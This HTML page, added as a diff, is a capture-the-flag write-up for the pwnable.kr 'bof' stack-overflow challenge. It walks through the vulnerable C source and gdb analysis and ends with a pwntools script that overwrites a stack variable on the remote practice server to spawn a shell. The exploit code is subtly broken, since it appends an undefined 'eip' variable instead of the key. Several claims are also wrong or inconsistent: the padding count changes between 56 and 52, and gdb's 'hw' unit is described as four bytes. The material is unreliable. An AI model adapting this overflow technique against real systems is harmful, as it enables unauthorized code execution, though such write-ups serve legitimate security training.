@@ -1,0 +1,139 @@
+<html>
+	<head>
+	<meta charset="UTF-8">
+	<meta name="description" content="quackland.tk - under construction">
+	<meta name="author" content="quackland.tk">
+	<link rel="stylesheet" href="/styles/dracula.css">
+	<script src="/js/highlight.pack.js"></script>
+	<script>hljs.highlightAll();</script>
+	<title>quackland.kr</title>
+
+	<style type="text/css">
+		body {
+			background-color:black;
+			color:white;
+			font-family:hack;
+			padding-left: 137px;
+			padding-right: 137px;
+		}
+		h1 {
+			font-size: 40px;
+			color:#81cc4b;
+			text-align: center;
+		}
+		h2 {
+			font-size: 30px;
+			color:#81cc4b;
+		}
+		a { color: white; }
+		.hello {
+			position: fixed;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+		}
+		.fading {
+			animation:fading 7s infinite
+		}
+		@keyframes fading{
+			0%{opacity:0}
+			50%{opacity:1}
+			100%{opacity:0}
+		}
+	</style>
+</head>
+<body>
+<h1 id="bof-from-pwnable.kr">bof From Pwnable.kr</h1>
+<h4 id="category-toddlers-bottle">Category : Toddler’s Bottle</h4>
+<p>The third challenge from the pwnable.kr is the bof. But the twist here is , it’s not vanilla bof that we see everywhere. The vanilla bof is simple: we overflow the buffer, overwrite the eip and then make it execute the payload. Here we need to overwrite a specific variable in order to gain command execution on the server. So let’s get started.</p>
+<h4 id="setup-gdb">Setup GDB</h4>
+<h5 id="i-will-be-using-the-gdb-debugger-with-peda-extension-to-exploit-this-challenge.-so-you-can-install-gdb-from-your-linux-repositories-and-download-peda-from-here.">I will be using the gdb debugger with peda extension to exploit this challenge. So you can install gdb from your linux repositories and download peda from <a href="https://github.com/longld/peda">here</a>.</h5>
+<p>Let’s start by reading the challenge prompt and download the important files to our box.</p>
+<p><img src="https://i.imgur.com/uFGSPaC.png" /></p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>wget <span class="st">&quot;http://pwnable.kr/bin/bof&quot;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>wget <span class="st">&quot;http://pwnable.kr/bin/bof.c&quot;</span></span></code></pre></div>
+<h2 id="dry-run">Dry Run</h2>
+<p>We have a binary file and source code file. Let’s give executable permissions to the binary file and run it.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> chmod +x bof</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ./bof</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">overflow</span> me : </span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">aaaaaaaaaaaaaaaaaaaaaaaaa</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Nah..</span></span></code></pre></div>
+<p>So it’s a simple binary ask for input and then says Nah. Now lets review the source code and see what happens in the background.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> func<span class="op">(</span><span class="dt">int</span> key<span class="op">){</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> overflowme<span class="op">[</span><span class="dv">32</span><span class="op">];</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;overflow me : &quot;</span><span class="op">);</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>    gets<span class="op">(</span>overflowme<span class="op">);</span>   <span class="co">// smash me!</span></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span><span class="op">(</span>key <span class="op">==</span> <span class="bn">0xcafebabe</span><span class="op">){</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>        system<span class="op">(</span><span class="st">&quot;/bin/sh&quot;</span><span class="op">);</span></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span><span class="op">{</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;Nah..</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span><span class="op">*</span> argv<span class="op">[]){</span></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>    func<span class="op">(</span><span class="bn">0xdeadbeef</span><span class="op">);</span></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>A function is called with hex value <strong>“0xdeadbeef”</strong> that is saved to the int key. Buffer overflow of 32 bytes is created and value is fetched from the user. Then if the key value contains the hex value of 0xcafebabe, we get our shell.</p>
+<p>So it’s not like a typical bof where we overwrite the eip pointer to gain command execution. Here all we need to do is overwrite the key variable.</p>
+<h2 id="analysis-with-gdb">Analysis with GDB</h2>
+<p>Open the binary with gdb and see what protection is available on it. The protections won’t matter in this challenge but it’s good practice to check them.</p>
+<p><img src="https://i.imgur.com/ahOyKrk.png" /></p>
+<pre><code>CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : Partial</code></pre>
+<p><strong>NX</strong>: The NX (do not execute) bit is a technology used in CPUs that guarantees that certain memory areas (such as the stack and heap) are not executable, and others, such as the code section, cannot be written. It basically prevents us from using simpler techniques as we did in this post where we wrote a shellcode in the stack and then executed it.</p>
+<p><strong>ASLR</strong>: Basically randomizes the base of the libraries (libc) so that we can’t know the memory address of functions of the libc. The ASLR avoids the technique Ret2libc and forces us to have to leak addresses of the same in order to calculate base.</p>
+<p><strong>PIE</strong>: This technique, like the ASLR, randomizes the base address but in this case it is from the binary itself. This makes it difficult for us to use gadgets or functions of the binary.</p>
+<p><strong>Canario</strong>: Normally, a random value is generated at program initialization, and inserted at the end of the high risk area where the stack overflows, at the end of the function, it is checked whether the canary value has been modified.</p>
+<p><strong>RELRO</strong>: Relocation Read-Only (or RELRO) is a security measure which makes some binary sections read-only. There are two RELRO “modes”: partial and full.</p>
+<p>You can read more about them <a href="https://ironhackers.es/en/tutoriales/pwn-rop-bypass-nx-aslr-pie-y-canary/">here</a> and <a href="https://ctf101.org/binary-exploitation/relocation-read-only/">here</a>.</p>
+<h4 id="note">Note</h4>
+<h5 id="since-we-have-canary-enabled-overwriting-eip-will-actually-be-detected-and-stopped.">Since we have canary enabled, overwriting eip will actually be detected and stopped.</h5>
+<p>Analyze the binary in gdb. We see that all the main does is pass 0xdeadbeef to esp and call the function func.</p>
+<p><img src="https://i.imgur.com/AAMOuwZ.png" /></p>
+<p>Examine the func function. Here the cmp at 0x00000654 if what checks if the key variable value is 0xcafebabe or not.</p>
+<p><img src="https://i.imgur.com/DTEEeDO.png" /></p>
+<p>So let’s set breakpoint at main, run the binary and then set breakpoint at cmp in the func function.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co"># breakpoint at main and running the binary.</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">gdb-peda$</span> break main</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Breakpoint</span> 1 at 0x68d</span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="ex">gdb-peda$</span> r</span></code></pre></div>
+<p>Setting breakpoint at cmp in func.</p>
+<p><img src="https://i.imgur.com/eTUHPvt.png" /></p>
+<p>Use the command ni (next instruction) to slowly reach the cmp statement while checking what’s happening.</p>
+<p><img src="https://i.imgur.com/WfB3T8m.png" /></p>
+<p><img src="https://i.imgur.com/kSqfNny.png" /></p>
+<p>Once you reach the cmp statement analyze the memory. We will be checking for value 0xdeadbeef as that is the current value of the key.</p>
+<p><img src="https://i.imgur.com/RjMQkzu.png" /></p>
+<p>Command used is x/50xhw. x =&gt; examine hw =&gt; half word (i.e 4 bytes)</p>
+<p>Command basically says show the 50 hw in hex currently in memory.</p>
+<p>0x61 is “a”, thus the input we provided to fill the buffer. So after 13 half words we reach the value 0xdeadbeef. This means if we fill the buffer with 14*4 = 56 a’s we will overwrite the key variable with 0x616161.</p>
+<p>Cool, we know how to overwrite it. So if we fill the buffer with 52 a’ and then the value 0xcafebabe. The key variable is overwritten with 0xcafebabe and we pass the check in the binary.</p>
+<h2 id="creating-exploit">Creating Exploit</h2>
+<p>As <a href="https://hackmd.io/@duckie/H13pgI5QP">previous challenege</a> we will be writing the exploit in python and with the pwntools library.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python3</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>padding <span class="op">=</span> b<span class="st">&quot;A&quot;</span><span class="op">*</span><span class="dv">52</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>key <span class="op">=</span> p32(<span class="bn">0xcafebabe</span>)</span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> padding <span class="op">+</span> eip </span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span> (payload)</span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>conn <span class="op">=</span> remote(<span class="st">&#39;pwnable.kr&#39;</span>,<span class="dv">9000</span>)</span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="co">#conn = process(&quot;./bof&quot;)</span></span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a>conn.sendline(payload)</span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a>conn.sendline(<span class="st">&quot;id&quot;</span>)</span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a>conn.interactive()</span></code></pre></div>
+<p>padding of 52 A’s and with then overwritten key with 0xcafebabe. Run it and we get a shell.</p>
+<p><img src="https://i.imgur.com/vhzSTg6.png" /></p></body>
+</html>
